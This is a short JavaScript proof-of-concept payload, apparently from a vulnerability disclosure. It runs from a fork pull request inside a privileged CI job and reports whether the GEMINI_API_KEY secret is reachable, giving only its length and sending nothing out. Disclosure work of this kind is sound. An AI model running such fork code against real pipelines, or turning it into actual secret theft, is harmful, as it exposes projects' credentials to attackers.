// PoC marker executed by the fork's code inside the privileged chained_e2e jobs.
// Presence-only: it prints facts and exfiltrates nothing.
console.log('[PoC] *** ATTACKER-CONTROLLED CODE EXECUTED IN PRIVILEGED chained_e2e JOB ***');
console.log('[PoC] This code is from the fork PR head, checked out by chained_e2e.yml');
console.log('[PoC] GITHUB_REPOSITORY =', process.env.GITHUB_REPOSITORY || '(unset)');
console.log('[PoC] GITHUB_EVENT_NAME =', process.env.GITHUB_EVENT_NAME || '(unset)');
const k = process.env.GEMINI_API_KEY;
console.log(k
  ? `[PoC] GEMINI_API_KEY IS PRESENT in attacker-controlled process env (value redacted, length ${k.length})`
  : '[PoC] GEMINI_API_KEY not present in this step');
console.log('[PoC] A real attacker would exfiltrate the key from here. PoC stops — nothing leaves this run.');
